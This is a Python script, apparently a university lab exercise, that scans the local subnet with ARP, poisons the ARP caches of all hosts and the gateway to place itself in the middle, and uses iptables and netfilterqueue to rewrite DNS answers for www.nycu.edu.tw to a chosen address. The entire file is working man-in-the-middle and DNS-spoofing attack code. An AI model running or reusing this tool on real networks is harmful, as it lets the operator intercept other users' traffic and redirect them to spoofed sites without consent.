#!/usr/bin/env python3

from os import system, geteuid
from sys import exit
from math import log2
import atexit
import netifaces as ni
from scapy.all import ARP, Ether, srp, send, IP, UDP, DNS, DNSRR, DNSQR
from netfilterqueue import NetfilterQueue

gw = None
arp_table = {}


def main():
    if geteuid() != 0:
        exit('Please run as root')
    task1()
    task2()
    atexit.register(cleanup)

    system('iptables -I FORWARD -j NFQUEUE --queue-num 42 -p udp --sport 53')
    system('iptables -I FORWARD -j REJECT -p tcp --sport 53')
    queue = NetfilterQueue()
    queue.bind(42, task4)

    try:
        queue.run()
    except KeyboardInterrupt:
        exit(0)


def task1():
    global gw, arp_table

    gw = ni.gateways()[ni.AF_INET][0]
    itf = ni.ifaddresses(gw[1])[ni.AF_INET][0]
    cidr = 32 - sum([int(log2(256-int(i))) for i in itf['netmask'].split('.')])
    net = itf['addr'] + '/' + str(cidr)

    arp = ARP(pdst=net)
    broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
    results = srp(broadcast / arp, timeout=3, verbose=False)[0]

    for sent, recv in results:
        arp_table[recv.psrc] = recv.hwsrc

    print('Available devices')
    print('+-----------------+-------------------+')
    print('| IP Address      | MAC Address       |')
    print('+-----------------+-------------------+')
    for key in arp_table:
        print('| %-15s | %17s |' % (key, arp_table[key]))
    print('+-----------------+-------------------+')


def task2():
    for neibr in arp_table:
        if neibr == gw[0]:
            continue

        arp1 = ARP(op=2, hwdst=arp_table[gw[0]], pdst=gw[0], psrc=neibr)
        arp2 = ARP(op=2, hwdst=arp_table[neibr], pdst=neibr, psrc=gw[0])
        send(arp1, verbose=False)
        send(arp2, verbose=False)


def task4(pkt):
    spkt = IP(pkt.get_payload())
    if spkt[DNSQR].qname == b'www.nycu.edu.tw.':
        spkt[DNS].ancount = 1
        spkt[DNS].an = DNSRR(rrname='www.nycu.edu.tw',
                             rdata='140.113.207.246')

        del spkt[IP].len
        del spkt[IP].chksum
        del spkt[UDP].len
        del spkt[UDP].chksum

        pkt.set_payload(bytes(spkt))
        print('NYCU homepage is redirected to 140.113.207.246')
    pkt.accept()


def cleanup():
    print('Cleaning up...')
    system('iptables -D FORWARD -j NFQUEUE --queue-num 42 -p udp --sport 53')
    system('iptables -D FORWARD -j REJECT -p tcp --sport 53')


if __name__ == '__main__':
    main()
